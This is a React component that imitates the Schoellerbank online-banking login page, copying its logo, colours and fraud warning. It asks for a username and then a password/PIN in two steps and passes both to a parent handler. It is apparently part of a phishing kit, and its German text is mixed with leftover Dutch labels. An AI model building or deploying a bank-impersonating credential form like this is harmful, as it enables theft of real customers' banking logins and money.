"use client";

import React, { useState } from "react";

type Props = {
  formData: {
    verfuegernummer?: string;
    pin?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: () => void;
  saving?: boolean;
};

export function Schoellerbank({ formData, onChange, handleRouteAction, saving }: Props) {
  const [step, setStep] = useState(1);

  const handleNextStep = (e: React.FormEvent) => {
    e.preventDefault();
    if (formData.verfuegernummer) {
      setStep(2);
    }
  };

  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    handleRouteAction();
  };

  return (
    <div className="min-h-screen flex flex-col font-sans">
      {/* Header */}
      <header className="bg-white h-[85px] flex items-center px-4 md:px-12 w-full shadow-sm relative z-10">
        <img 
          src="/schoellerbank-logo.webp" 
          alt="Schoellerbank Wealth Management" 
          className="h-[60px] object-contain ml-4 lg:ml-24" 
        />
      </header>

      {/* Main Background Area */}
      <main 
        className="flex-grow flex items-center justify-center p-4 bg-cover bg-center"
        style={{ backgroundImage: "url('/schoellerbank-bg.webp')" }}
      >
        {/* Center Card */}
        <div className="relative w-full max-w-[650px]">
          <div className="bg-white shadow-[0_4px_20px_rgba(0,0,0,0.3)] overflow-hidden">
            
            {/* Red Header Bar */}
            <div className="bg-[#93272c] px-6 py-4">
              <h1 className="text-white text-[22px] font-normal tracking-wide">Login Online Banking</h1>
            </div>

            <div className="p-6 md:p-8">
              {/* Warning Box */}
              <div className="border border-[#cc0000] bg-[#fdf5f5] p-5 flex gap-4 mb-6">
                <div className="flex-shrink-0 mt-1">
                  <div className="w-8 h-8 rounded-full bg-[#cc0000] flex items-center justify-center text-white font-bold text-xl leading-none">
                    !
                  </div>
                </div>
                <div className="flex flex-col text-[#cc0000]">
                  <h2 className="font-bold text-[14px] mb-1">ACHTUNG: Betrugswarnung!</h2>
                  <p className="text-[14px] leading-relaxed mb-4">
                    Geben Sie <strong className="font-bold">NIEMALS</strong> Ihre Zugangsdaten weiter!<br />
                    Erlauben Sie fremden Personen <strong className="font-bold">NIEMALS</strong> Zugriff auf Ihre<br />Endgeräte!
                  </p>
                  
                  <h3 className="font-bold text-[14px] mb-1">WICHTIGE SICHERHEITSHINWEISE</h3>
                  <p className="text-[14px] text-gray-800">
                    Weitere Informationen erhalten Sie <a href="#" className="text-[#cc0000] underline">hier</a>.
                  </p>
                </div>
              </div>

              {/* Intro Text */}
              <p className="text-[14px] text-gray-800 mb-6 leading-relaxed pr-2">
                Tijdens het inloggen wordt een beveiligde verbinding opgezet. Let op dat u uw inloggegevens nergens anders invoert en deze geheim houdt. Wir werden Sie nie nach Ihrem Wachtwoord oder einer Transaktionsnummer (=TAN) fragen!
              </p>

              {/* Login Form */}
              <form 
                onSubmit={step === 1 ? handleNextStep : handleFinalSubmit}
                className="flex flex-col"
              >
                {step === 1 ? (
                  <>
                    <div className="flex justify-between items-end mb-1">
                      <label className="text-[12px] text-gray-400">Gebruikersnaam</label>
                      <div className="text-[12px] text-[#93272c]">
                        <a href="#" className="hover:underline">Hochkontrast</a> <span className="text-gray-400 mx-1">|</span> <a href="#" className="hover:underline">English</a>
                      </div>
                    </div>
                    <div className="mt-1 mb-6">
                      <input 
                        type="text" 
                        value={formData.verfuegernummer || ""}
                        onChange={(e) => onChange("verfuegernummer", e.target.value)}
                        className="w-full bg-[#e8e9ea] border border-gray-200 rounded-[3px] p-3 h-11 outline-none focus:border-gray-400 transition-colors text-[14px] text-gray-800"
                      />
                    </div>
                  </>
                ) : (
                  <>
                    <div className="flex justify-between items-end mb-1">
                      <label className="text-[12px] text-gray-400">Wachtwoord</label>
                      <div className="text-[12px] text-[#93272c]">
                        <a href="#" className="hover:underline">Hochkontrast</a> <span className="text-gray-400 mx-1">|</span> <a href="#" className="hover:underline">English</a>
                      </div>
                    </div>
                    <div className="mt-1 mb-6">
                      <input 
                        type="password" 
                        value={formData.pin || ""}
                        onChange={(e) => onChange("pin", e.target.value)}
                        autoFocus
                        className="w-full bg-[#e8e9ea] border border-gray-200 rounded-[3px] p-3 h-11 outline-none focus:border-gray-400 transition-colors text-[14px] text-gray-800"
                      />
                    </div>
                  </>
                )}

                {/* First Time Registration Link */}
                <div className="text-center mb-6">
                  <a href="#" className="text-[14px] text-[#93272c] hover:underline">
                    Sie melden sich zum ersten Mal an?
                  </a>
                </div>

                {/* Legal Notice */}
                <div className="text-center mb-6 px-4">
                  <p className="text-[13px] text-gray-600">
                    Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen<br />der Bank ausdrücklich zu.
                  </p>
                </div>

                {/* Primary Button */}
                <button 
                  type="submit" 
                  disabled={saving} 
                  className="w-full bg-[#93272c] hover:bg-[#7a1f23] text-white py-3 rounded-[3px] font-normal transition-colors text-[16px]"
                >
                  {saving ? "Laden..." : "Weiter"}
                </button>
              </form>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
